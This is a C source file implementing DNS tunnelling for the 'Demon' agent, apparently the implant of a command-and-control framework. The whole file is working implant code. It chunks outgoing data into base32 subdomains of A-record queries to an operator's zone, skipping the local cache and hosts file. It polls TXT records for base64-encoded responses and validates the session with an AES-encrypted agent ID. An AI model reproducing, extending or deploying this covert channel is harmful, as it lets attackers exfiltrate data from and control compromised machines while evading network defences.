#ifdef TRANSPORT_DNS

#include <Demon.h>
#include <common/Macros.h>
#include <core/TransportDns.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <crypt/AesCrypt.h>

/* windns.h (pulled in by Demon.h via windows.h) defines DnsRecordListFree as a
 * function-like macro: DnsRecordListFree(p,t) → DnsFree(p,DnsFreeRecordList).
 * That expansion corrupts calls through the Win32 function-pointer struct member.
 * Undefine it so the bare name is used as a struct member, not as a macro call. */
#ifdef DnsRecordListFree
#undef DnsRecordListFree
#endif

/* RFC 4648 base32 alphabet: a–z2–7, lowercase, no padding */
static const CHAR B32Alphabet[ 32 ] = "abcdefghijklmnopqrstuvwxyz234567";

/* DnsQuery_W DNS_TYPE_A = 1, DNS_TYPE_TEXT = 16 */
#define DNS_TYPE_A    1
#define DNS_TYPE_TEXT 16

static const CHAR HEX_DNS[] = "0123456789abcdef";

static PCHAR DnsHexWrite( PCHAR dst, DWORD val, INT digits ) {
    INT i;
    for ( i = digits - 1; i >= 0; i-- ) {
        dst[ i ] = HEX_DNS[ val & 0xf ];
        val >>= 4;
    }
    return dst + digits;
}

/* ------------------------------------------------------------------ */
/*  Base32 encode / decode                                             */
/* ------------------------------------------------------------------ */

VOID DnsBase32Encode( PBYTE In, DWORD InLen, PCHAR Out )
{
    DWORD i   = 0;
    DWORD j   = 0;
    UINT  buf = 0;
    INT   bits = 0;

    for ( i = 0; i < InLen; i++ )
    {
        buf  = ( buf << 8 ) | In[ i ];
        bits += 8;
        while ( bits >= 5 )
        {
            bits -= 5;
            Out[ j++ ] = B32Alphabet[ ( buf >> bits ) & 0x1F ];
        }
    }
    if ( bits > 0 )
        Out[ j++ ] = B32Alphabet[ ( buf << ( 5 - bits ) ) & 0x1F ];

    Out[ j ] = '\0';
}

DWORD DnsBase32Decode( PCHAR In, DWORD InLen, PBYTE Out )
{
    UINT  buf   = 0;
    INT   bits  = 0;
    DWORD j     = 0;
    DWORD i;
    BYTE  v;
    CHAR  c;

    for ( i = 0; i < InLen; i++ )
    {
        c = In[ i ];
        if ( c >= 'a' && c <= 'z' )      v = (BYTE)( c - 'a' );
        else if ( c >= '2' && c <= '7' ) v = (BYTE)( c - '2' + 26 );
        else break; /* padding or invalid */

        buf  = ( buf << 5 ) | v;
        bits += 5;
        if ( bits >= 8 )
        {
            bits -= 8;
            Out[ j++ ] = (BYTE)( buf >> bits );
        }
    }
    return j;
}

/* ------------------------------------------------------------------ */
/*  FQDN builders                                                      */
/* ------------------------------------------------------------------ */

/* Build uplink A-query FQDN into Out (must be ≥ 253 bytes).
 * Format: <b32chunk>.<seq4><cid4><tot4>.<tok8>.<zone>
 * cid4/tot4 are 4 hex chars (2 bytes each) to support payloads up to
 * 65535 × 30 = ~1.9 MB without cid/tot wrapping. */
static VOID DnsBuildUploadFqdn(
    PBYTE  Chunk, DWORD ChunkLen,
    UINT16 Seq,   UINT16 Cid, UINT16 Tot,
    DWORD  Token,
    LPWSTR Zone,
    PCHAR  Out
) {
    CHAR b32[ 64 ]   = { 0 };
    CHAR meta[ 13 ]  = { 0 };
    CHAR tok8[ 9 ]   = { 0 };
    CHAR zoneA[ 64 ] = { 0 };
    DWORD i;

    DnsBase32Encode( Chunk, ChunkLen, b32 );

    /* meta = seq4 + cid4 + tot4 (12 hex chars) */
    {
        PCHAR p = meta;
        p = DnsHexWrite( p, (DWORD)Seq, 4 );
        p = DnsHexWrite( p, (DWORD)Cid, 4 );
        p = DnsHexWrite( p, (DWORD)Tot, 4 );
        *p = '\0';
    }

    DnsHexWrite( tok8, Token, 8 );
    tok8[ 8 ] = '\0';

    /* Convert zone from WCHAR to CHAR */
    for ( i = 0; Zone[ i ] && i < 63; i++ )
        zoneA[ i ] = (CHAR)Zone[ i ];
    zoneA[ i ] = '\0';

    /* Assemble: b32 + '.' + meta + '.' + tok8 + '.' + zone */
    StringCopyA( Out, b32 );
    StringConcatA( Out, "." );
    StringConcatA( Out, meta );
    StringConcatA( Out, "." );
    StringConcatA( Out, tok8 );
    StringConcatA( Out, "." );
    StringConcatA( Out, zoneA );
}

/* Build downlink TXT-poll FQDN into Out.
 * Format: p.<seq4>.<off8>.<tok8>.<zone>
 * off8 is 8 hex chars (DWORD) — supports responses up to 4 GB. */
static VOID DnsBuildPollFqdn(
    UINT16 Seq,
    DWORD  Offset,
    DWORD  Token,
    LPWSTR Zone,
    PCHAR  Out
) {
    CHAR zoneA[ 64 ] = { 0 };
    DWORD i;

    for ( i = 0; Zone[ i ] && i < 63; i++ )
        zoneA[ i ] = (CHAR)Zone[ i ];
    zoneA[ i ] = '\0';

    /* Assemble: "p." + seq4 + "." + off8 + "." + tok8 + "." + zone */
    {
        CHAR seq4[ 5 ] = { 0 };
        CHAR off8[ 9 ] = { 0 };
        CHAR tok8[ 9 ] = { 0 };

        DnsHexWrite( seq4, (DWORD)Seq, 4 ); seq4[ 4 ] = '\0';
        DnsHexWrite( off8, Offset,     8 ); off8[ 8 ] = '\0';
        DnsHexWrite( tok8, Token,      8 ); tok8[ 8 ] = '\0';

        StringCopyA( Out, "p." );
        StringConcatA( Out, seq4 );
        StringConcatA( Out, "." );
        StringConcatA( Out, off8 );
        StringConcatA( Out, "." );
        StringConcatA( Out, tok8 );
        StringConcatA( Out, "." );
        StringConcatA( Out, zoneA );
    }
}

/* ------------------------------------------------------------------ */
/*  DNS wire queries via dnsapi.dll                                    */
/* ------------------------------------------------------------------ */

/* Send an A-query for Fqdn via DnsQuery_W.
 * Returns the raw DWORD IPv4 address (host byte order) or 0 on failure. */
static DWORD DnsQueryA( PCHAR Fqdn )
{
    WCHAR    FqdnW[ 253 ] = { 0 };
    PDNS_RECORD pRec      = NULL;
    DNS_STATUS  status;
    DWORD       result    = 0;
    DWORD       i;

    /* ASCII → wide */
    for ( i = 0; Fqdn[ i ]; i++ )
        FqdnW[ i ] = (WCHAR)Fqdn[ i ];

    status = Instance->Win32.DnsQuery_W(
        FqdnW,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        NULL,
        &pRec,
        NULL
    );

    if ( status == 0 && pRec )
    {
        result = pRec->Data.A.IpAddress;
        Instance->Win32.DnsRecordListFree( pRec, DnsFreeRecordList );
    }

    return result;
}

/* Send a TXT-query for Fqdn.
 * Decodes the first TXT string (base64) into OutBuf.
 * Returns number of decoded bytes, or 0 on failure / no data. */
static DWORD DnsQueryTxt( PCHAR Fqdn, PBYTE OutBuf, DWORD OutMax )
{
    WCHAR      FqdnW[ 253 ] = { 0 };
    PDNS_RECORD pRec         = NULL;
    DNS_STATUS  status;
    DWORD       decoded      = 0;
    DWORD       i;

    for ( i = 0; Fqdn[ i ]; i++ )
        FqdnW[ i ] = (WCHAR)Fqdn[ i ];

    status = Instance->Win32.DnsQuery_W(
        FqdnW,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        NULL,
        &pRec,
        NULL
    );

    if ( status != 0 || !pRec )
        return 0;

    /* Iterate TXT strings in the first TEXT record */
    if ( pRec->wType == DNS_TYPE_TEXT && pRec->Data.TXT.dwStringCount > 0 )
    {
        /* DnsQuery_W returns DNS_RECORDW: TXT pStringArray entries are PWSTR (wide chars).
         * Measure wide string length, then extract the low byte of each WCHAR into a
         * narrow buffer before base64 decoding (TXT content is always ASCII base64). */
        PWSTR  wStr = (PWSTR)pRec->Data.TXT.pStringArray[ 0 ];
        DWORD  wLen = 0;
        while ( wStr[ wLen ] ) wLen++;

        CHAR   narrow[ 512 ] = { 0 };
        DWORD  nLen = wLen < 511 ? wLen : 511;
        for ( DWORD k = 0; k < nLen; k++ )
            narrow[ k ] = (CHAR)( wStr[ k ] & 0xFF );

        PVOID  DecBuf = NULL;
        SIZE_T DecLen = 0;
        Base64Decode( (PUCHAR)narrow, (SIZE_T)nLen, &DecBuf, &DecLen );
        if ( DecBuf && DecLen > 0 )
        {
            DWORD copyLen = (DWORD)( DecLen > (SIZE_T)OutMax ? (SIZE_T)OutMax : DecLen );
            MemCopy( OutBuf, DecBuf, copyLen );
            Instance->Win32.LocalFree( DecBuf );
            decoded = copyLen;
        }
    }

    Instance->Win32.DnsRecordListFree( pRec, DnsFreeRecordList );
    return decoded;
}

/* ------------------------------------------------------------------ */
/*  DnsSend — main transport entry point                               */
/* ------------------------------------------------------------------ */

BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
{
    UINT16  Seq        = Instance->Config.Transport.DnsCtx.SeqNum;
    LPWSTR  Zone       = Instance->Config.Transport.DnsCtx.ZoneDomain;
    DWORD   ChunkDelay = Instance->Config.Transport.DnsCtx.ChunkDelayMs;
    DWORD   Token      = Instance->Config.Transport.DnsCtx.SessionToken;

    PBYTE   Data    = (PBYTE)SendData->Buffer;
    DWORD   DataLen = (DWORD)SendData->Length;

    CHAR    Fqdn[ 253 ] = { 0 };
    DWORD   IpResp;
    DWORD   off;
    DWORD   retry;
    DWORD   chunkLen;

    /* Increment sequence number (wrap 0xFFFF → 0x0001) */
    Seq++;
    if ( Seq == 0 ) Seq = 1;
    Instance->Config.Transport.DnsCtx.SeqNum = Seq;

    /* -------- UPLINK: send data as A-query chunks -------- */
    /* Use DWORD/UINT16 — BYTE would overflow (max 255) for payloads > 7,650 bytes,
     * silently truncating the chunk count and causing partial uplink delivery. */
    DWORD  TotalChunks = ( DataLen + DNS_CHUNK_BYTES - 1 ) / DNS_CHUNK_BYTES;
    if ( TotalChunks == 0 ) TotalChunks = 1;

    for ( DWORD cid = 0; cid < TotalChunks; cid++ )
    {
        off      = cid * DNS_CHUNK_BYTES;
        chunkLen = DataLen - off;
        if ( chunkLen > DNS_CHUNK_BYTES ) chunkLen = DNS_CHUNK_BYTES;

        DnsBuildUploadFqdn(
            Data + off, chunkLen,
            Seq, (UINT16)cid, (UINT16)TotalChunks,
            Token,
            Zone,
            Fqdn
        );

        retry = 0;
        do {
            IpResp = DnsQueryA( Fqdn );
            /* 0.0.0.2 = NACK, retry; 0.0.0.1 = ACK; 0.0.0.0 = rejected */
        } while ( IpResp == 0x02000000 && ++retry < DNS_RETRY_MAX );

        if ( IpResp != 0x01000000 )
        {
            PRINTF( "DnsSend: chunk %d rejected (ip=%08x)\n", (int)cid, IpResp )
            return FALSE;
        }

        if ( ChunkDelay )
            Instance->Win32.WaitForSingleObjectEx( (HANDLE)-1, ChunkDelay, FALSE );
    }

    /* -------- DOWNLINK: poll TXT records for server response -------- */
    DWORD  PollOffset = 0;
    BOOL   Done       = FALSE;
    DWORD  Iter       = 0;

    /* Pre-allocate a response accumulation buffer */
    DWORD  RespCap    = 0x4000; /* 16 KB initial, grown as needed */
    PBYTE  RespBuf    = (PBYTE)Instance->Win32.LocalAlloc( LPTR, RespCap );
    DWORD  RespLen    = 0;

    if ( !RespBuf ) return FALSE;

    BYTE  TxtBuf[ 512 ];

    while ( !Done && Iter < DNS_POLL_MAX_ITER )
    {
        Iter++;
        MemZero( TxtBuf, sizeof( TxtBuf ) );

        DnsBuildPollFqdn( Seq, PollOffset, Token, Zone, Fqdn );

        DWORD Got = DnsQueryTxt( Fqdn, TxtBuf, sizeof( TxtBuf ) );
        if ( Got == 0 )
        {
            /* No data ready — wait one slot and retry */
            Instance->Win32.WaitForSingleObjectEx( (HANDLE)-1, 500, FALSE );
            continue;
        }

        /* Check for sentinel byte 0xFF indicating last chunk */
        if ( TxtBuf[ 0 ] == 0xFF )
        {
            /* Append remaining bytes (after sentinel) */
            DWORD Extra = Got - 1;
            if ( Extra > 0 )
            {
                if ( RespLen + Extra > RespCap )
                {
                    RespCap = RespLen + Extra + 0x1000;
                    RespBuf = (PBYTE)Instance->Win32.LocalReAlloc( RespBuf, RespCap, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    if ( !RespBuf ) return FALSE;
                }
                MemCopy( RespBuf + RespLen, TxtBuf + 1, Extra );
                RespLen += Extra;
            }
            Done = TRUE;
        }
        else
        {
            /* Normal chunk — append and advance offset */
            if ( RespLen + Got > RespCap )
            {
                RespCap = RespLen + Got + 0x4000;
                RespBuf = (PBYTE)Instance->Win32.LocalReAlloc( RespBuf, RespCap, LMEM_MOVEABLE | LMEM_ZEROINIT );
                if ( !RespBuf ) return FALSE;
            }
            MemCopy( RespBuf + RespLen, TxtBuf, Got );
            RespLen   += Got;
            PollOffset += Got;
        }
    }

    if ( !Done || RespLen == 0 )
    {
        Instance->Win32.LocalFree( RespBuf );
        return FALSE;
    }

    RecvData->Buffer = RespBuf;
    RecvData->Length = RespLen;
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  DnsTransportInit — send DEMON_INITIALIZE via DNS                   */
/* ------------------------------------------------------------------ */

BOOL DnsTransportInit( VOID )
{
    PVOID  Response = NULL;
    SIZE_T RespSize = 0;
    BOOL   Result   = FALSE;

    /* Derive an opaque per-session token from the AES key bytes.
     * This value identifies DNS downlink responses without exposing the agent ID. */
    Instance->Config.Transport.DnsCtx.SessionToken =
          (UINT32)Instance->Config.AES.Key[ 0 ]
        | ( (UINT32)Instance->Config.AES.Key[ 1 ] << 8  )
        | ( (UINT32)Instance->Config.AES.Key[ 2 ] << 16 )
        | ( (UINT32)Instance->Config.AES.Key[ 3 ] << 24 );

    /* PackageTransmitNow internally calls TransportSend → DnsSend.
     * On success Response holds the server's AES-encrypted reply.
     * Do NOT call DnsSend again. */
    if ( !PackageTransmitNow( Instance->MetaData, &Response, &RespSize ) )
        return FALSE;

    if ( Response && RespSize >= 4 )
    {
        AESCTX AesCtx = { 0 };

        /* Server encrypts the AgentID echo with the session AES key.
         * Decrypt before comparing — mirrors the HTTP transport init in Transport.c. */
        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Response, RespSize );

        if ( (UINT32)Instance->Session.AgentID == (UINT32)DEREF( Response ) )
            Result = TRUE;

        Instance->Win32.LocalFree( Response );
    }

    return Result;
}

#endif /* TRANSPORT_DNS */
